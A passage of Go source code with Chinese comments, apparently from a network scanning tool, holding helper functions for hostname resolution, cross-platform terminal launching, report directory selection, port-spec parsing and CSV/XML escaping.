		return s, nil
	}
	ips, err := net.LookupIP(s)
	if err != nil || len(ips) == 0 {
		return "", fmt.Errorf("无法解析 %s", s)
	}
	for _, ip := range ips {
		if v4 := ip.To4(); v4 != nil {
			return v4.String(), nil
		}
	}
	return ips[0].String(), nil
}

// runInTerminal 在新终端窗口运行命令(跨平台)
func runInTerminal(exe string, args []string) error {
	switch runtime.GOOS {
	case "windows":
		a := append([]string{"/c", "start", "NetScan-SSH", exe}, args...)
		return exec.Command("cmd", a...).Start()
	case "darwin":
		cmdline := "'" + strings.ReplaceAll(exe, "'", `'\''`) + "'"
		for _, a := range args {
			cmdline += " '" + strings.ReplaceAll(a, "'", `'\''`) + "'"
		}
		script := `tell application "Terminal" to do script ` + strconv.Quote(cmdline)
		return exec.Command("osascript", "-e", script).Start()
	default: // linux / freebsd 等
		candidates := []struct{ name, flag string }{
			{"x-terminal-emulator", "-e"},
			{"gnome-terminal", "--"},
			{"konsole", "-e"},
			{"xfce4-terminal", "-x"},
			{"xterm", "-e"},
		}
		for _, c := range candidates {
			if _, err := exec.LookPath(c.name); err == nil {
				a := append([]string{c.flag, exe}, args...)
				return exec.Command(c.name, a...).Start()
			}
		}
		return fmt.Errorf("未找到可用终端模拟器(x-terminal-emulator/gnome-terminal/konsole/xterm)")
	}
}

// downloadDir 返回 HTML 报告保存目录(优先 Downloads, 回退到用户主目录)
func downloadDir() string {
	home, _ := os.UserHomeDir()
	if home == "" {
		return "."
	}
	d := filepath.Join(home, "Downloads")
	if fi, err := os.Stat(d); err == nil && fi.IsDir() {
		return d
	}
	return home
}

func stripScheme(s string) string {
	s = strings.TrimSpace(s)
	s = strings.TrimPrefix(strings.TrimPrefix(s, "http://"), "https://")
	return s
}

func firstPort(spec string, def int) int {
	spec = strings.TrimSpace(spec)
	if spec == "" {
		return def
	}
	p := strings.SplitN(spec, ",", 2)[0]
	p = strings.SplitN(p, "-", 2)[0]
	p = strings.TrimPrefix(strings.TrimSpace(p), "top-")
	if n, err := strconv.Atoi(p); err == nil && n > 0 && n <= 65535 {
		return n
	}
	return def
}

func csvCell(s string) string {
	if strings.ContainsAny(s, ",\"\n") {
		return "\"" + strings.ReplaceAll(s, "\"", "\"\"") + "\""
	}
	return s
}

func xmlEsc(s string) string {
	return strings.NewReplacer("&", "&amp;", "<", "&lt;", ">", "&gt;", "\"", "&quot;").Replace(s)
}
